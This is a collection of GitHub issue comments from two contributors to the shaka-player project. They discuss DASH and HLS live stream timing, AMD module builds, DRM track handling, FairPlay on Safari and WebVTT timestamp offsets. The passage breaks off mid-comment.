    "TobbeMobiTV": "The livesimulator developed for DASH-IF, http://vm2.dashif.org/livesim/testpic_2s/Manifest.mpd plays in dash.js and in the dev branch of ExoPlayer. Would be nice if you could make it play in shaka-player as well. More info available at http://vm2.dashif.org/\n. I'd just like to add that my live simulator is meant as a reference test stream and is very strict on the timing. The segments are only made available during the exact interval which is defined by the DASH standard depending on the availabilityStartTime, startNumber, segmentDuration, and timeShiftBufferDepth. If the request is too early or too late, the simulator actually sends back the amount of time mismatch in the body of the 404 response.\nTo avoid 404's due to bad timing, the first thing is to make sure about is that the server and client clocks are synchronized. This can be done using the new DASH UTCTiming mechanism. The simulator supports this direct and head mode in its development version at http://vm2.dashif.org/livesim-dev/utc_direct-head/testpic_2s/Manifest.mpd.\n. @joeyparrish \nI wrote specifically about the SegmenteTemplate which is the alternative I've been working with in depth for years and for which I really have good test sources. In this case, the available segments correspond to a sliding time-shift window of time range [max(AST, now-timeShiftBufferDepth), now] (a bit sloppy). Right at start, it is shorter, but one timeShiftBufferDepth after AST, it reaches its full duration.\nI have not worked with explicit SegmentLists, but it clearly says in the standard that startNumber (optional) refers to the first segment in the period. Thus, it cannot be changed until there is a new period. On the other hand, in this case it is easy to have an explicit list of segments, and that list can be changed with an update of the MPD (keeping AST and Period start unchanged) to give a time-shift window.\nI've recently started to implement some test streams for live SegmentTimeLine with $Time$ template. In this case, there is a list of templates corresponding to the timeShift window. Often, the minimumUpdatePeriod=0 which means that the player should ask for a new MPD file for each segment. The new MPD will then typically have the oldest segment dropped and the newest added.\nIn DASH-IF, the discussions have concluded that we should not mix $Number$ template with SegmentTimeLine, but keep to $Time$ template. I'll post the URL once it becomes available (next week, probably).\nI don't have the full context of the original content discussed by @Feenposhleen, but it seems that the AST was updated with the MPD which is not allowed. Inserting a new period with a new startNumber is allowed though, and I have links that do that like;\nhttp://vm2.dashif.org/livesim/periods_20/testpic_2s/Manifest.mpd\n(a new period every 3 minutes and a miniumumUpdatePeriod=90s).\nIn this case you need to keep as many periods as your time-shift-buffer says.\nI think DASH is to generous in its options about combining MPD segment schemes. One of the goals of DASH-IF is to reduce the used alternatives, which is especially important for live (dynamic MPDs).\nIn any case, your general principle that the URLs to specific segments should not be changed after MPD updates should always hold true.\n. ",
    "sanbornhilland": "Can I just get clarification on 404 errors? If I use the stream @TobbeMobiTV provided then I get a ton of 404s but the stream appears to be playing back fine. I noticed in deb2100\nthat you're ignoring these. Does that mean these 404s are acceptable and we can safely ignore them as long we we're getting playback?\n. Great, thanks a lot of the explanation. \n. Has shaka been tested with live encrypted content? I've hit a snag trying to play live encrypted content. I can't see where the problem is so I was wondering if you've done this before. This might help me to narrow down the source of the problem. \n. Okay, that's what I figured but I wanted to check because I can't figure out why it's breaking down for me. Thanks.\n. I agree with you that it is easy enough to keep track of but if it's ever ambiguous what the starting state is or just not known what the starting state is, it seems like there is the potential to get out of sync. To me it seems like it's the responsibility of the player to manage its own state and that way whoever is using it can't ever get out of sync or make the wrong assumption about what state it is in.\nAlso, I'm happy to submit a pull request so you can concentrate on higher priority stuff.  Maybe this won't be generally considered useful.\n. I was originally looking at the Restrictions class but saw that it was only getting called after a license request so was unsure what exactly this class was for. But it does seem like a more natural place to add bandwidth limits.\nAt the moment the solution I have provides methods for setting max and min bandwidth from the Player and then any tracks outside this range get filtered out when streamVideoSource.getVideoTracks() is called. This has the advantage of being settable at any time but I like your suggestion of adding maxBandwidth (and minBandwidth) to the Restrictions class even though from what I can tell it will involve more work. It's not immediately obvious to me what the best way to have restrictions update on setting.\nEdit: Specifically what is unclear to me is where to call videoSource_.setRestrictions() if it going to get called outside of the license request callback.\n. Yup, I'll submit to master. Was unsure where to go without a develop branch.\nI'll put more thought into the setMax/setMin vs get/set restrictions. But this seems like a good point so I'll change it and submit again.\nThanks for the quick feedback.\n. @palmerj3 \nDo you know if it's straightforward to take your build and use it as an AMD module? Ideally I'd like to import shaka using RequireJS. I've attempted to take the output of this build task and wrap it in a requireJS define() which works to a point. I can import it but then when I try to play back content I get an error: cannot read property addEventListener of undefined.\nFor some reason I'm having a hard time finding out exactly where it's failing but from what I can tell it seems like there might be a problem when it hits FakeEventTarget and tries to create shaka.util.MultiMap. shaka seems to be undefined at this point. \nDo you have any insight here? Or at the very least, could you explain how you are using it? This might give me a better idea of what I have to do to get it working how I want.\n. @palmerj3 maybe I spoke too soon. At least for requireJS purposes, your commonJS build works fine if you wrap the whole thing with: \ndefine(function (require, exports, module) {...});\nI tried doing this with your example above and it playsback fine. But when I try to require this module in our actual project I run into these undefined errors when I try to playback content. So it looks like something is not playing nice with our project\nI agree with not supporting all module flavours though for the big ones you could add a flag that let's you set which module type you want.\n. Alright, thanks. I can wait. Building it manually makes it a bit awkward to maintain in our project. So anything on master that is not on 1.2.x is for the next minor release and only gets published to npm when that release happens? Essentially I'm waiting for 1.3 then? Is that right?\n. Great, thanks guys.\n. Alright, great! I don't know what tack you plan to take but I just want to register my support for something along the lines of (2). I think it is desirable to be able to setup the player with restrictions prior to loading content.\n. @palmerj3 @joeyparrish \nContinuing the discussion from #35 . There I said that I had no problem running @palmerj3's solution but was getting errors when trying to load shaka as an AMD module inside our project. I realized that the working solution loads and Http video source whereas we are loading a Dash video source. If you modify the solution to be this: \nrequire(['./amd.js'], function(shaka) {\n        // shaka = shaka.shaka;\n```\n    shaka.polyfill.Fullscreen.install();\n    shaka.polyfill.MediaKeys.install();\n    shaka.polyfill.VideoPlaybackQuality.install();\nvar player = new shaka.player.Player(document.getElementById('video'));\nvar playerSource = new shaka.player.DashVideoSource('http://shaka-player-demo.appspot.com/assets/car-20120827-manifest.mpd');\nplayer.load(playerSource).then(function() {\n  player.play();\n});\n\n});\n}());\n```\nthen it fails. It gives me that 'cannot read addEventListener of undefined' error that I was getting before.\nSo it appears that it's not an issue with our source but that exporting shaka as an AMD module and trying to load a Dash source is not working at the moment. Is a module export something that you'd like to support officially? Is it worth registering this as a bug?\n. Great. Thanks for moving so quickly on this. Importing as an AMD module works fine now. Though shaka is still getting attached to the window as far as I can see. Is there any way around that?\n. Sorry, just a quick follow up to my last comment.\nUsing @palmerj3 's amd.js build, shaka gets attached to the window. Using @palmerj3's commonJS build and then wrapping it in a define() requireJS define function also works but does not attach shaka to the window.\n. Just tried the master branch build and got the same TypeError as @palmerj3. Shaka gets imported fine but then on Dash playback it seems like the same error that got fixed in 4571061.\n. @joeyparrish: v1.2.0-156-ga1c0e44\n. @palmerj3 \nOkay, looking @joeyparrish's gist, I think the cause of the problem is that I am not passing an estimator into the source constructor. I suspect that this is why @palmerj3 is getting the same errors, because the basic test app I was using was based on the one he posted above. If I pass null in @joeyparrish's gist instead of an estimator, then I get the same errors.\nSo can you just clarify that? Now we have to explicitly create and pass an estimator?\n. This is great, thanks!\n. Yup, you're right. I don't know what was going on yesterday that I thought it wasn't working.\n. No, I think what you have in mind is essentially what I have in mind as well. Specifically the option to add additional data into the request body other than the initData would be great (headers and cookies I anticipate would also be useful), otherwise we would have to add params to the url that we provide to DrmSchemeInfo and that's not ideal.\n. The autoplay attribute is working correctly now, thanks for the fix. \nBut this one is still behaving the same way. I notice that on your demo player it does not do it because the player instance is not created until someone tries to load content and at that time it's created and event listeners are added. But in our case we are instantiating the player and adding event listeners on page load and then when someone picks content we just have to load it into our instance. So on our page load we are creating a player and adding listeners but not giving it a video source and the bufferingStart event is firing right away on page load.\n. I'm using v1.3.0-28-g77552f2\nI'm not having this problem anymore but now it looks like it's not firing any bufferingStart events at all. I put a breakpoint in Player.enterBufferingState_ and it's never getting hit. BufferingEnd events are firing though.\n. Actually, that's not entirely true. It will fire if you run out your current buffer during playback. But it does not fire when you first load content and start buffering because onWatchdogTimer_  checks that the video isn't paused before firing Player.enterBufferingState. Is that the correct behaviour? I would think it should fire when it initially starts buffering content even if the player is paused.\n. We have a manifest with 3 video adaptation sets all with group=2 and they all have the same protection. I can see that the mpd_processor is correctly grouping them into the same StreamSetInfo but I notice that because of this: \n\nIf the streams are encrypted then assume the key system can probably\n decrypt the lowest quality streams.  This enables the VideoSource to\n select at least one stream for stream startup without having to query the\n key system first.\nThe lowest quality streams are the streams that are contained within\n the AdaptationSet which contains THE lowest quality stream.`\n\nOnly the representations in the first adaptation set have allowedByKeySystem=true initially. \nI thought that on keystatuseschanged these other adaptation sets in the group would end up having allowedByKeySystem set to true in shaka.player.StreamVideoSource.prototype.onKeyStatusesChange.\nBut it looks like this: streamInfo.allowedByKeySystem = !message on line 959 of stream_video_source is never getting hit so they are never being exposed as available tracks.\nCan you help to clarify this situation for me and why this is happening. I'm still hazy on the DASH spec and it's unclear to me if having multiple adaptation sets in the same group with the same content protection is unusual/non-standards-compliant or if this was an unanticipated scenario and a bug in Shaka.\n. We are using cenc:default_KID but this has the same value for each of the Adaptation Sets within the same group and it seems that Shaka then ends up ignoring the adaptation sets with the higher bandwidths onkeystatuseschanged. From what I understand of your explanation above though it sounds like unless we have different keys there is no reason not to be putting all of our Representations into a single Adaptation Set.\n. Yes I was seeing the message \"Key... was not specified in the manifest\". However, I am confused by what this is supposed to mean because if I check for the keyId that it is referring to I can see that it is the default key in each adaptation set.\n. Just found the source of this. I was accidentally creating two players. \n. Related to this and a possible alternative for some people, how difficult would it be to add an option to sidecar load WebVTT subtitles?\n. +1 \nI have the same issue and this fixes the problem.\nEDIT: It only partially fixes the problem. EX: If you have a manifest that has an english audio track and a french audio track but both of them are protected with Widevine and Playready then by only removing the break statement it ends up listing 4 audio tracks when in fact there are only 2 audio tracks available with the supported encryption.\n. I've emailed @joeyparrish with some test content that should reproduce the issue.\n. No, as far as I know I just removed that break statement. \n. I have no objections.\n. I hate to do this but I actually still am having a problem with 1.4.0. When I call player.getAudioTracks() it returns 8 tracks instead of 2. But there are actually only 2 different tracks in the array and each of them is repeated 4 times. Am I failing to specify somewhere that I only want tracks with widevine protection?\n. It should work with the last sample I sent you but I was going to verify it. I'm having trouble playing the content in the sample app. Can you still play the content that I sent?\n. Okay after some further examination it turns out the problem was caused by our incorrect contentProtection callback (thanks for the tipoff). We were ignoring schemeIdUri and just returning a DrmSchemeInfo instance every time and this caused it to think there were more tracks than there really were. After this change, the fix you put into 1.4.0 works perfectly. \nThanks for the help.\n. Great, thanks for the fix.\n. I can't figure out what is going wrong with this. @joeyparrish if you have time can you guys try to reproduce this to see why multiple time ranges are getting buffered.\n. Update: This problem doesn't happen in 1.3.2, only 1.4.0\n. There are 2. And then this assertion gets triggered 4 or 5 times and then playback and buffering just stops and nothing happens but nothing is being logged so I can't see what has failed.\n. Which content are you using?\n. Fetching segment s\u2026a.m\u2026a.SegmentReference {startTime: 228.88, endTime: 232.44, startByte: 0, endByte: null, url: g\u2026g.Uri}\nfetch\nEstimated bandwidth: 1.98 Mbps\nFetch done.\nBuffering goal reached.\nEstimated bandwidth: 2.75 Mbps\nFetch done.\nAssertion failed: Multiple time ranges should not be buffered!\nFetching segment s\u2026a.m\u2026a.SegmentReference {startTime: 232.44, endTime: 236, startByte: 0, endByte: null, url: g\u2026g.Uri}\nfetch\nBuffering goal reached.\nEstimated bandwidth: 2.99 Mbps\nFetch done.\nBuffering goal reached.\nBuffering goal reached.\nBuffering goal reached.\nBuffering goal reached.\nBuffering goal reached (repeated over and over).\n. Also, the player says it has 15 seconds buffered ahead but pressing play does nothing.\n. Chrome 43.0.2357.132 (64-bit)\n. Chrome on Mac.\nHow can I disable bandwidth estimation?\n. If I turn off adaptation in your sample app then the problem goes away.\n. Great, this would be a very useful addition. \n. Based on this short discussion I opened pull request #123 with a possible change.\n. Based on the addition of the new configure() method, setPlaybackStartTime should get removed and handled by this configure() method, no?\n. I ran into this today actually and I agree it should be reset between playbacks.\nIs the idea that configuration persists across playbacks so anything that shouldn't persist will not go in the configure() method?\n. No I think that makes things clearer. As a temp workaround I was just setting playbackStartTime to null if I wanted to wipe out the previous one and just get the default but intuitively I think you're right that setting the start time should be a one time thing. \nI think all your rationale makes sense so I'll just leave it for the moment.\n. Woohoo!\n. This works great but only for one track as far as I can tell. If I call it multiple times then only the last one will get used. I wouldn't be able to add say, a french and an english track. Is that correct? If so, would it be possible to make it so that we can call this multiple times or have it accept an array of vtt urls?\n. Yeah, that's a good point.\n. I'm not quite clear on (1). \n(2) sounds good. I'm not convinced there is reason to add another event unless there is a specific reason why you don't want to fire adaptation events when text tracks switch. So the simplest might be to just fire adaptation events on text track switching as well as audio and video. But maybe I'm missing something here.\n. O, ic. Yes it is becoming a misnomer. I'm still of the mind though that only one event is needed. Perhaps it could be called something like TrackUpdateEvent. And its fired when any changes happen to any of the tracks for whatever reason. Perhaps that's too blunt, I'm not sure, and more fined grained control could be required.\n. Okay, thanks for the heads up. For now I am going to recommend avoiding calling getTextTracks() immediately after selecting a new track and instead, syncing on adaptation events.\n. I'm confused about where this issue ended up and what the WebVTT support is in V2. This issue seems to be related to segmented VTT files in a text/vtt format whereas #277 was about support for segmented WebVTT in mp4 segments. Is there support for both or only the latter?\n. NM I finally tracked it down.\n. As an alternative, what do you think of adding a 'restrictionschanged' event that gets fired when someone sets new restrictions. Or a 'configurationchanged' event that gets fired when player.configure is called as a way to keep things decoupled. \n. Yup, sorry. I accidentally hit create before I had added all the info\n. Yes. Video starts playing at 60s because we setPlaybackStartTime to 60. Then if you try to rewind it just goes into a paused state at 60s (which is the beginning of the buffered region) and doesn't go into the time period 59s and less.\n. To me it seems like as a user the expected behaviour would be to keep going backwards past the beginning of the buffered area but if this is as designed I'm wondering what the reason is for implementing it the way it is now.\n. I'm not sure configurationchanged is the best choice of names for this event because currently it's firing every time configure() is called. But that could be called without a change to the config object I suppose. Maybe just configurationEvent ?\nAlso, should there be listens annotations added for this and the adaptation event? Either on i_abr_manager or simple_abr_manager?\n. Well it doesn't make sense to me to duplicate stuff so if your change will cover this case then waiting for #67 makes sense. Just a question regarding implementation thought: currently it looks like the track lists are being forced to update when a bandwidthEvent is fired. So adding a tracksChangedEvent sounds like it would be firing after the time when I want it to fire. When you introduce this event what is the flow going to be? \n. So it sounds like (2) would cover the case that I am interested in with this pull request? When new restrictions are applied through the configure() method, the tracksChanged event would fire? In which case simple_abr_manager can listen for this and force an update. If I have this right, it sounds acceptable to me.\nAnother question I have though is that the naming of this event is confusing to me. In the case of (2) for instance, when the tracksChanged event fires after a configuration update, none of the tracks have changed at that point. The track list hasn't been filtered based on the new restrictions at that point. Is this correct or do I have an incomplete understanding of what's going on?\n. Alright in that case it sounds like it will sufficient. How far along are you with this?\n. It looks like this will work as expected in my previous PR. Can you check that these new changes are sane.\n. Yeah this is really low priority for us because we have no reason to set restrictions like this. It just seems like counterintuitive behaviour so I figured I'd report it.\n. Quick update: With the latest change, it seems the behaviour is different now. Instead of playing the highest track it fails with cannot read property 'segmentIndexSource' of null.\n. The good content is encrypted but it does not have the default_KID. The presence of this property triggers the keystatuseschange event?\n. Quick follow up: This content: (http://cdn-origin94-dit1-vod.quickplay.com/vod/product/u/qpmezzdisneycomocdclearfeature/master.ism/master.mpd) shows two audio tracks but they show up as the same language even though in the manifest they don't.\n. (1) Looking at player.videoSource_.streamSetsByType.getAll('audio') I see that there are two shaka.media.StreamInfo objects and the one is not showing up in player.getAudioTracks() has allowedByKeySystem set to false. \nI also noticed that the language is specified as 'th' on the shaka.media.StreamSetInfo even though only one track is thai and the other is punjabi. I suppose that's related to (2). \nFinally, I'm curious why when I call this.videoSource_.streamSetsByType.getAll('audio') the array returned includes a shaka.media.StreamSetInfo with contentType = video\n(2) Yes that shows up in the log.\n. O, okay, that makes more sense. Thanks for the update.\n. This great. The hard work is much appreciated.\n. Now that I'm looking at this more closely I do have a quick question. You mention a DRM category in your comment but there isn't a DRM category in the Error.Category object. Is there a plan to add error codes for this in the future? One of the problems that we have had is recognizing DRM errors because no codes are provided and error messages seem to be changing often. Do you have any thoughts on this?\n. Okay, great. \nThe lack of standard error codes is something we have been trying to determine how to handle.\nWe are interested in stuff like:\n- DRM is disabled\n- License is expired\n- License can\u2019t be installed\nBut I'm not even sure if these are all possible to recognize or if error messages are the best we will get.\nDo you have an idea about what the cross browser support will be for these? Is it possible to determine these things consistently across browsers?\n. Yeah, basically, you get something back from the license server but it's rejected by the CDM.\n. One example that immediately comes to mind is that its quite common for someone who is learning or not as proficient in a second language to want the audio in the language they are learning and the text in their native language. This way they can try to listen for the audio but still catch what's going on when they do not fully understand the audio.\nAs for those two behaviour questions, I'm not sure and it's probably worth a discussion. I'm not sure about the first. For the second I don't think there is a need to change the current behaviour. If the user wants to toggle on text tracks then they can do that.\n. @joeyparrish Thanks for taking the time to work through this and provide detailed information. I'll go back to the drawing board and see what is going on our end that is causing this.\n. Great, thanks for all the info guys, this is really helpful. I hadn't seen that chrome bug. We are indeed experiencing this in chrome.\nIt had occurred to me to listen to this endOfStream event but I agree it's a bad solution and if we absolutely need a temp solution then we will just do it ourselves.\n. I'm running chrome: 46.0.2490.80 (64-bit) and chrome canary:  48.0.2550.0 canary (64-bit) also seems to behave the same for me. This is on MAC OSX 10.9.5\nThere is audio associated with the content though so couldn't it still be related to these unresolved webAudio issues?\nIn any case, I'll see if I can get some content that exhibits this issue that we can make public and then I can put reproduction steps on that issue.\n. I know you guys are working hard on getting v2 out. Just curious if you have an estimate on this or if it's on the back burner for now.\n. Great, thanks for the estimate. \n. I thought it could be useful to catalogue some of the issues with building HLS support into Shaka, as I come across them. \n1) As reported in #439 a lot of HLS VOD content seems not to start at 0 but it so far seems impossible to know what the start time is of the content until the first segment is downloaded.\n2) HLS can include just an audio stream as it's lowest quality stream (see below), the intention being that if your bandwidth drops low enough then the player should switch down to this audio only variant. But it is not an audio stream in the sense that you can choose this audio stream vs some other stream (english vs spanish etc.). It seems to me like this doesn't fit nicely into Shaka's streaming model.\n```\nEXT-X-STREAM-INF:BANDWIDTH=263851,CODECS=\"mp4a.40.2, avc1.4d400d\",RESOLUTION=416x234,AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear1/prog_index.m3u8\nEXT-X-I-FRAME-STREAM-INF:BANDWIDTH=28451,CODECS=\"avc1.4d400d\",URI=\"gear1/iframe_index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=577610,CODECS=\"mp4a.40.2, avc1.4d401e\",RESOLUTION=640x360,AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear2/prog_index.m3u8\nEXT-X-I-FRAME-STREAM-INF:BANDWIDTH=181534,CODECS=\"avc1.4d401e\",URI=\"gear2/iframe_index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=915905,CODECS=\"mp4a.40.2, avc1.4d401f\",RESOLUTION=960x540,AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear3/prog_index.m3u8\nEXT-X-I-FRAME-STREAM-INF:BANDWIDTH=297056,CODECS=\"avc1.4d401f\",URI=\"gear3/iframe_index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=1030138,CODECS=\"mp4a.40.2, avc1.4d401f\",RESOLUTION=1280x720,AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear4/prog_index.m3u8\nEXT-X-I-FRAME-STREAM-INF:BANDWIDTH=339492,CODECS=\"avc1.4d401f\",URI=\"gear4/iframe_index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=1924009,CODECS=\"mp4a.40.2, avc1.4d401f\",RESOLUTION=1920x1080,AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear5/prog_index.m3u8\nEXT-X-I-FRAME-STREAM-INF:BANDWIDTH=669554,CODECS=\"avc1.4d401f\",URI=\"gear5/iframe_index.m3u8\"\nEXT-X-STREAM-INF:BANDWIDTH=41457,CODECS=\"mp4a.40.2\",AUDIO=\"bipbop_audio\",SUBTITLES=\"subs\"\ngear0/prog_index.m3u8\n``\n. @amirch1 We are seeing a similar sounding problem but are starting to suspect we have a content issue. Do you have any logs at all? I would be curious what errors you're getting.\n. On Saturday I was using the latest from master so I think this is still the latest. I ended up bundling in the uncompiled library so I could get more detailed logs. I can see that the problematic content is giving me :Assertion failed: lastReference cannot begin after the end of the Period`. This looks like a content problem to me but I don't believe it actually affects the startup of the stream (correct me if I'm wrong) because it's not throwing any errors, it's just logging the assertion failure.\nHowever I can see I'm also getting currentPeriod.startTime=0 lookupTime=0 for audio and video, repeatedly. It looks like the first chunk is starting at 1.0390625 so it's never being found and then no requests for chunks are going out. This also appears to be a content problem but I haven't had an issue playing this content in Shaka 1.6.x so I'm curious what the change is. Can I configure the player to just pick the first chunk if it doesn't have something that starts at 0? I've been looking through the docs but it's not clear to me if this is possible or not.\n. Okay, great. I'll look into our content.\n. Okay thanks. So is V2 considered feature complete and you are just working out the bugs or are there features still missing that you plan to include in V2.0.0.\n. Alright, thanks.\n. We have a server issue to resolve but then I should be able to provide you with a working Safari sample with HLS Fairplay content.\n. I'm still working on getting you some HLS + Fairplay samples to give you. But there is sample client code from apple here: https://developer.apple.com/streaming/fps/ if you download the FairPlay Streaming Server SDK. If you haven't looked at this it would be useful for comparing to the v01b polyfill.\nFor instance, for FPS on Safari the init data is formed by concatenating the initData from the needkey event with a contentId and an Apple App Cert. I believe this is different from Chrome and other browsers that just require the init data? It looks to me like currently Shaka and the MediaKeys polyfill assumes the needkey event.initData is sufficient.\nAfter that it looks like there are some other differences. The concatenated init data is passed in the createSession call and then there is no generateRequest call at all. This also appears to be different than how Shaka is handling it where the createSession call does not take any arguments and there is a generateRequest call that takes initData.\nIt appears to me that the flow on Safari is a bit different than on Chrome. I have tested that Apple sample code with HLS + Fairplay content and it does work in Safari.\nI'm also having the following issue in Safari: In shaka.polyfill.PatchedMediaKeys.v01b.MediaKeys.prototype.onWebkitNeedKey_ it throws an error when trying to dispatch the shaka FakeEvent: UNSPECIFIED_EVENT_TYPE_ERR: DOM Events Exception 0: The Event's type was not specified by initializing the event before the method was called. The only way I can see to avoid that is to create a custom event instead like this:\nvar event2 = new CustomEvent('encrypted');\nevent2.initDataType = 'webm';\nevent2.initData = event.initData;\nI'm not sure you'd want to handle it like this just for consistency reasons but this was how I could get around that error just for POC purposes.\n. The content is encrypted.\n. Yes it works in later versions.\n. @joeyparrish thanks for the info. I don't expect any Shaka support for this, just trying to get a handle on what's going on. Only reason we were concerned with 49 was that it is the lats version available on OSX 10.7 I believe. \n. Alright, after checking all the codecs in the manifest in question, they all fail the test you provided in Chrome 49. Thanks for informing me that EME and MediaSource support are independent of each other.\n. Okay, good point. I'll see what I can do.\n. No, I think that is sensible. It should give greater control if we have multiple audio variants of the same language which I assume is the intention. \nThanks for clearing that up. I think it would be worth putting a note in the v2 migration guide about the difference in APIs in this respect from 1.x to 2.\n. Actually, on some further reflection and discussion I want to present a possible problematic scenario. \nWhat happens if there are three audio tracks, all of them are english. Two of them are the same audio track with different bitrates but the third is the content audio plus directors commentary. How would we handle this situation? Selecting a specific track will turn off ABR which is not desirable if I want the player to handle switching bitrates between the first two tracks. But configuring the player for english tracks now is ambiguous because it doesn't allow us to specify if we want commentary or not.\nUpdate\nOne way to handle this would be to expose the track role as specified in the manifest and allow for configuring the player for a preferred role as well as is already done with text tracks.\n. Assuming that configure() is triggered immediately then I don't see any reason not to continue to use this approach.\n. I'm not convinced this is ideal or complete but I'd like to see if we can back port this fix to 1.6.x because we will still be relying on 1.6.x for some time and this is causing problems for us. Notably I'm not sure how to properly handle the nudgeNeeded issue. If I take it out then seeking seems to work fine for me but I'm not sure how to reproduce the other conditions that require this nudge.\n. As per comment in #429 you can review and merge this first if you'd prefer to remove the nudge cleanly in a separate pull request.\n. The following is the simplest reproduction of the issue. Starting to suspect this is a Safari bug. Unless I am missing something really obvious:\n```\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/CastVideos/hls/designing_for_google_cast/fileSequence0.ts');\n    xhr.responseType = 'arraybuffer';\n    xhr.onreadystatechange = function () {\n      if (xhr.readyState !== 4) return;\n  var ms = new MediaSource();\n\n  ms.addEventListener('sourceopen', function () {\n\n    var videoBuffer = ms.addSourceBuffer('video/mp2t');\n\n    videoBuffer.addEventListener('updateend', function () {\n      console.log(videoBuffer.buffered.start(0));\n    });\n\n    videoBuffer.appendBuffer(xhr.response);\n  });\n\n  app.video.src = window.URL.createObjectURL(ms);\n}\nxhr.send();\n\n``\n. It looks like you are correct. I had usedmediastreamvalidator` and incorrectly assumed that since  HLS is assumed to start at 0 and the stream checked out, that the first chunk was starting at 0. \nIf I set the presentationTimeOffset to 10 then it fills the buffer as expected. The problem is that the playlist does not indicate that the first chunk starts at 10. This also seems to be a problem for a lot of HLS content. All the test content I have used for development has had a start time greater than 0. It seems to me that to support HLS in Safari will require gracefully handling these start times but it's unclear to me how to do that right now as offset time isn't known until after the chunk is downloaded.\n. A related issue is that a single, ostensibly continuous .ts segment gets buffered as multiple, non-adjacent ranges. In Shaka 1.x there was some detection and attempt at handling multiple buffered ranges but I'm not seeing anything in Shaka 2.0 that is similar. Was this intentionally removed? Are multiple ranges acceptable in 2.0? My understanding is that there should only be one range.\nTo be clear, I think that there is some problem with the segments in question but other HLS players seem to handle it fine so I am trying to determine if this multiple time ranges issue is actually a problem or not.\n. I believe this is fine to close. After some additional investigation we tracked it down to a Safari bug and opened an issue with Apple. It seems they've corrected this in the latest Safari Technology Preview Release 10  of Safari 9.1.2.\n. I'm having a similar issue using the latest from master but it's because the webVTT tracks we are using have position start|center|end instead of  line-left|center|line-right. I believe the disagreement stems from a change in the WebVTT spec. The tracks we have are based on the Working Draft here: https://www.w3.org/TR/webvtt1/#webvtt-position-cue-setting and the implementation seems to be based on the Editor's Draft here: https://w3c.github.io/webvtt/#webvtt-position-cue-setting\nAs I understand it, that second draft is the bleeding edge and is not settled. What do you think of adding support for the previous version of the spec since that is the one that I think is currently stable.\n. #481 has more discussion. It seems that it's unclear whether VTT timestamps are supposed to be absolute of relative.\n. I'm working on getting you details and a test stream I can share.\n. @joeyparrish I emailed you a test stream.\n. Is there any update on this? The stream I emailed @joeyparrish is will expire on Sept. 7 so if there is an opportunity to discuss this issue before then, it would be useful.\n. We've talked to the stream provider and received the following response:\n1) The unexpected \"X-TIMESTAMP-MAP\" attribute in webvtt files will be removed. This will also address the timescale issue since the timescales are tied to those tags.\n2) Other players, EX: Exoplayer are working with the relative timestamps so changing the stream will break playback elsewhere. The suggestion from them is to put fix #481 behind a configuration flag to maintain backwards compatibility with other players.\n. This looks good. I will try to get a PR in for your review.\n. Related to this issue, if we have the following in the mpd:\n<SegmentTemplate timescale=\"10000000\" presentationTimeOffset=\"1796832000000000\" media=\"$RepresentationID$/Segment-$Time$.vtt\">\n  <SegmentTimeline>\n    <S t=\"1796832000000000\" d=\"20000000\" r=\"1049\" />\n  </SegmentTimeline>\n</SegmentTemplate>\nwhat would be the expected result? Video and audio times are calculated correctly but text cues are all generated starting at -1796832000000000. I'm looking at the DASH spec but I'm still unsure how the startTimes are supposed to be calculated. \n. @sandersaares Thank you for pointing me in the right direction, I had not read that.\nIn that section (DASH-IF IOP 6.4.5) it says:\n\nSuch external files are assumed do have a timeline aligned with the Period, so that TTML time 00:00:00.000 corresponds to the start of the Period. The presentation time offset is expected to be not presented, and if present, expected to be ignored by the DASH client. \nThe same applies to side-loaded WebVTT files. In that case, the @mimeType is text/vtt. If segmented subtitles are needed, such as for live sources, ISOBMFF-packaged TTML or WebVTT segments are expected be used to provide proper timing.\n\nAccording to this it looks like Shaka should be ignoring the presentationTimeOffset if its present. And if I am reading it correctly this is actually independent of the issue of relative timestamps.\n@joeyparrish does this look correct to you? I can open an separate issue for this and likely provided a PR.\n. This would fix #480 and not break VOD as far as I can see.\n. Okay, this what I was worried about. I was looking for information on how VTT segment timestamps were supposed to be reported but I couldn't find any. I guess this is why.\nA config parameter would require us to know ahead of time whether the cues we were going to get back had relative or absolute timestamps which seems less than ideal. But if I understand you correctly you're saying there is no other indication from the manifest?\n. I'm going to reject this for now because it seems evident that this solution is incomplete and requires some additional discussion first.\n. Okay, thanks, will do. I was confused about those test failures. Thanks for the explanation.\n. Okay, thanks, will do. I was confused about those test failures. Thanks for the explanation.\n. I did not realize this was open when I opened #598. #598 duplicates this issue but this is a much better explanation of what we are looking for so that issue can be closed if you want.. This is reproducible in the shaka demo app using this content:\nhttps://dtvn-vod-sponsored.akamaized.net/ss/vol2/s/AEG_CP/ifcf0180800000004087/2016-10-04-09-14-50/IFCF0280800000004087/output_mobile_dash.ism/index.mpd\nIt's protected so just plug in a dummy url for license url. This will get your far enough to reproduce the issue.\nTo trigger this issue you can side load any vtt track\nplayer.addTextTrack('http://storage.googleapis.com/shaka-demo-assets/angel-one/s-en.webvtt', 'eng', 'caption', 'text/vtt');\n. Okay, I simply overwrote the old commit to address your feedback. Please double check that the test I have added seem appropriate. It's a rather indirect way of testing for this condition but I'm not sure how else to do it.\n. @joeyparrish I see what you are saying but the segmented VTT files we are receiving have segment relative timestamps. So the example you provide: \n```\nWEBVTT\n49912:00:00.000 --> 49912:00:05.000\nHello, world!\n```\nWould actually look like this:\n```\nWEBVTT\n0:00:00.000 --> 0:00:05.000\nHello, world!\n```\nHence applying any offset will cause a problem IF the assumption is that text tracks always align with the beginning of the period.\nI question this:\n\nAgain, this has nothing to do with presentationTimeOffset. The SegmentTimeline needs to reflect the contents of that segment - always.\n\nBecause this seems to suggest otherwise:\n\nSuch external files are assumed do have a timeline aligned with the Period, so that TTML time 00:00:00.000 corresponds to the start of the Period. The presentation time offset is expected to be not presented, and if present, expected to be ignored by the DASH client.\n\nAt the end of the day, I don't disagree that there is a problem with the manifest we are receiving. Our proposal to fix this problem was to have the text track offset removed from the manifest. But depending on how that DASH-IF IOP is interpreted it would seem that ignoring presentation time offsets for plaintext tracks might be the way to go.. Thanks for the hard work of investigating this. Sorry 